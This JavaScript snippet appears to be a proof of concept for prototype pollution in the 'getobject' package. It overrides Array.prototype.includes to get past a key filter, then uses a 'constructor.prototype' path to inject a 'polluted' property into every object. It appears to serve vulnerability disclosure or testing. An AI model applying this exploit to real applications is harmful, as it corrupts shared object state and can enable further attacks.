Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const getObject = require('getobject');
var obj = {};
getObject.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);